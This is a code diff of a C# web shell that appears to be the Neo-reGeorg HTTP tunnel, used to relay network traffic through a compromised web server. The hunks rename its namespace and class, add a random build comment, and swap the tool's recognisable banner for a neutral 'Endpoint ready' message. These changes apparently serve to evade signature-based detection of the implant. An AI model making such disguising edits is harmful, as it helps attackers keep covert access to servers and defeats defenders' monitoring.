@@ -1,3 +1,4 @@
+// Build: bjsjxsiu
 using System;
 using System.IO;
 using System.Net;
@@ -5,11 +6,11 @@ using System.Text;
 using System.Net.Sockets;
 using System.Web;
 
-namespace Neoreg
+namespace Pugreg
 {
-    public class Neoreg
+    public class Pugreg
     {
-        public Neoreg()
+        public Pugreg()
         {
             int DATA = 1;
             int CMD = 2;
@@ -21,7 +22,7 @@ namespace Neoreg
             int REDIRECTURL = 8;
             int FORCEREDIRECT = 9;
 
-            String GeorgHello = "NeoGeorg says, 'All seems fine'";
+            String EndpointMsg = "PugGeorg says, 'Endpoint ready'";
 
             Object[] info = new Object[40];
             Object[] rinfo = new Object[40];
@@ -235,7 +236,7 @@ namespace Neoreg
             }
             else
             {
-                httpResponse.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
+                httpResponse.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(EndpointMsg, de, en))));
             }
         }
         
